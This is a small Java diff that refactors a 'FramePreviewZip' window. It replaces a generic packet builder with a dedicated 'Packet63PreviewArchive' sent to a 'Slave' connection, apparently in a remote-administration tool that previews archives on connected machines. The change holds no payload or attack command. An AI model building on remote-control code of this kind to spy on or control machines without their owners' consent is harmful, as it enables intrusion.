@@ -22,8 +22,7 @@ import javax.swing.border.EmptyBorder;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet63PreviewArchive;
 
 
 @SuppressWarnings("serial")
@@ -114,7 +113,7 @@ public class FramePreviewZip extends BaseFrame {
 	}
 
 	public void reload() {
-		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.PREVIEW_ARCHIVE, new String[] { file }));
+		slave.addToSendQueue(new Packet63PreviewArchive(file));
 	}
 
 	public void exit() {
